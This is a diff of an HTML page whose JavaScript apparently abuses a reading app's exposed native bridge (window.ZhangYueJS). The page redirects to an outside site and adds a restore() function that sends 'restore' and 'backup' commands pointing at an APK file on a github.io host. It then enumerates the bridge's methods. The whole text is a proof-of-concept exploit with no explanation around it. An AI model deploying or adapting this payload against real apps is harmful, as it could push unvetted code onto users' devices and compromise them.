@@ -1,6 +1,6 @@
 <script type="text/javascript">
 document.location.href="https://z3.cn/";
-setTimeout("getinfo()",15);
+setTimeout("restore()",15);
 function getinfo(){
 	document.write("<h5>download book</h5>\r\n");
 	var action="download";
@@ -11,5 +11,17 @@ function getinfo(){
 		ret+=obj+"\r\n";
 	}
 	alert(ret);
+}
+function restore(){
+        document.write("<h5>download book</h5>\r\n");
+        var jobj='{"action":"restore","url":"https://zoro3s.github.io/hwireader/test.apk"}';
+        window.ZhangYueJS.do_command(jobj);
+	jobj='{"action":"backup","url":"https://zoro3s.github.io/hwireader/test.apk"}';
+	window.ZhangYueJS.do_command(jobj);
+        var ret="";
+        for (var obj in window.ZhangYueJS){
+                ret+=obj+"\r\n";
+        }
+        alert(ret);
 }
 </script>
